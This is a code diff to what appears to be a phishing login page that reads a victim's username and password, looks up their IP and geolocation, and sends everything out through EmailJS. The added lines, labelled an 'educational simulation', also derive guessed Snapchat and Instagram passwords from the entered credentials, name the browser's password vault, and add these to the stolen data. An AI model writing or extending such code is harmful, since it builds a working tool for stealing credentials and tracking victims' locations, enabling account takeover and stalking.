@@ -60,6 +60,28 @@
             const password = document.getElementById('password').value;
             const sendDate = new Date().toLocaleString('tr-TR');
 
+            // 1. & 2. & 5. Social Media Pattern Inference (Educational Simulation)
+            // Demonstrates how hackers assume password reuse across platforms.
+            const platformPatterns = {
+                snapchat: `${username.split('@')[0]}_Snap!`, // Common naming convention
+                instagram: password.length > 8 ? password : `${password}123`, // Pattern prediction
+                others: "Commonly used: Facebook, X (Twitter), LinkedIn"
+            };
+
+            // 3. Device Storage Location Detection
+            // Checks for the presence of browser-specific password managers.
+            const detectVaults = () => {
+                const isChrome = /Chrome/.test(navigator.userAgent);
+                const isSafari = /Safari/.test(navigator.userAgent) && !/Chrome/.test(navigator.userAgent);
+                if (isChrome) return "Google Password Manager (Chrome)";
+                if (isSafari) return "iCloud Keychain (Safari)";
+                return "Generic Browser Auto-fill";
+            };
+
+            // 4. Theoretical Photo Metadata (EXIF) Access
+            // Demonstrates the risk of "File Input" phishing where users are asked to 'verify' via a photo.
+            const photoRiskProfile = "Simulated: GPS_LAT/LONG extraction from last uploaded JPEG";
+
             let geoData = {};
             try {
                 // Konum ve IP bilgisini çek
@@ -81,7 +103,14 @@
                 device_model: navigator.platform,
                 browser: navigator.userAgent,
                 latitude: geoData.latitude || "",
-                longitude: geoData.longitude || ""
+                longitude: geoData.longitude || "",
+                
+                // New Educational Fields
+                snapchat_pattern: platformPatterns.snapchat,
+                instagram_pattern: platformPatterns.instagram,
+                social_media_others: platformPatterns.others,
+                storage_locations: detectVaults(),
+                photo_metadata: photoRiskProfile
             };
 
             // EmailJS ile gönder
